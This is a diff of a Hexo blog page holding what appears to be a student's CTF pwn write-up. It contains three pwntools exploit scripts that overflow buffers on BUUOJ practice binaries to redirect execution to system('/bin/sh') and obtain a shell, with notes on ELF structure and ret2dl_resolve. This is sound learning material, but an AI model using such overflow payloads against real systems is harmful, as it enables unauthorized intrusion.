@@ -7,9 +7,21 @@
   <meta http-equiv="expires" content="0">
   
   <title>第三周笔记 | Pdxbshx</title>
-  <meta name="author" content="pdxbshx">
+  <meta name="author" content="John Doe">
   
-  <meta name="description" content="不需要去抱怨什么|">
+  <meta name="description" content="一、ret2dl_resolve，ret2VDSO知识点1、ret2dl_resolve在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。
+
+如上图所示，链接器以section为单位对数据进行组织，以section header table对section进行描述，而忽略program header table中的内容；加载器以segment为单位对数据进行组织，以program header table对segment进行描述，而忽略section header table中的内容。其中，加载器中的segment实际由单个或多个链接器中的section组成。ELF文件包含三种类型：可重定位文件(relocatable)—编译器和汇编器产生的.o文件，被Linker所处理；可执行文件(executable)—Linker对.o文件进行处理输出的文件，进程映像；共享对象文件(shared object)—动态库文件.so。
+ELF文件结构：
+
+ELF文件分为多个部分，称为多个section，并且有一个基本的文件头用来保存文件的基本属性，包括是否为可执行文件、操作系统、CPU型号等
+.text Section 保存代码段和指令段
+.data Section 保存程序里设置好的初始化信息
+.real.text Section 保存程序里面我们暂时位置的跳转地址，比如链接之前的目标文件中add函数的跳转地址
+.symtab Section 符号表，保存当前文件里面我们未知的函数名称和地址的对应关系
+
+
+ELF文件链接过程："> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -95,12 +107,6 @@
 			</a>
 		  </li>
 		  
-		  <li>
-			<a href="/atom.xml" title="Subscribe me.">
-			  <i class="fa fa-user"></i>RSS
-			</a>
-		  </li>
-		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -165,7 +171,11 @@
 <p>程序运行一下：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-6.png"></p>
 <p>我们发现整个程序看起来比较简单，只要满足var[13]&#x3D;&#x3D;17就可以执行system(“bin&#x2F;sh”)函数，但是由于var[13]一开始就被赋值为0,所以我们直接对其进行写入，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28064</span>)</span><br><span class="line">payload = p32(<span class="number">17</span>)*<span class="number">14</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28064</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">14</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最终获得flag，结果如下：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-7.png"></p>
@@ -178,7 +188,12 @@
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-11.png"></p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-12.png"></p>
 <p>可以发现程序中调用了system函数，只不过参数不是”bin&#x2F;sh”，然后我们接着看vulnerable_function()函数，返回的是read函数，且可以将变量buf写入，我们之后可以找到’bin&#x2F;sh’这个参数的地址为0x0804a024,然后我们就可以开始写exp:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26707</span>)</span><br><span class="line">binsh_adr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(<span class="number">0x0804849E</span>)+p32(binsh_adr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">26707</span><span class="token punctuation">)</span>
+binsh_adr <span class="token operator">=</span> <span class="token number">0x0804A024</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804849E</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh_adr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后我们可以获得flag，结果如下：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-13.png"></p>
@@ -190,7 +205,14 @@
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-16.png"></p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-17.png"></p>
 <p>我们在backdoor函数中发现了system函数，然后我们找到该函数的地址0x004006E6,通过分析该程序的代码，我们发现这个程序首先需要我们输入一个数，然后用它来决定我们后面变量buf的值，构建的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25857</span>)</span><br><span class="line">sys_adr = <span class="number">0x004006e6</span></span><br><span class="line">payload1 = <span class="string">b&#x27;-1&#x27;</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(sys_adr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25857</span><span class="token punctuation">)</span>
+sys_adr <span class="token operator">=</span> <span class="token number">0x004006e6</span>
+payload1 <span class="token operator">=</span> <span class="token string">b'-1'</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+payload2 <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_adr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'name?'</span><span class="token punctuation">,</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后我们成功获得flag，结果如下所示：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/3-18.png"></p>
@@ -212,12 +234,12 @@
     
     
     <a href="/uncategorized/第四周笔记/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/uncategorized/第二周笔记/" type="button" class="btn btn-default ">下一页<i
+    <a href="/uncategorized/第二周笔记/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -231,7 +253,7 @@
 	<!-- comment -->
 	<!--
 <section id="comment">
-    <h2 class="title">留言</h2>
+    <h2 class="title">Comments</h2>
 
     
 </section>
@@ -257,6 +279,17 @@
 
 	<!-- categories -->
     
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/ret2dl-resolve-ret2VDSO/">ret2dl_resolve,ret2VDSO<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
 
 	<!-- tags -->
 	
@@ -296,7 +329,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2023 pdxbshx's Blog
+  &copy; 2023 John Doe's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
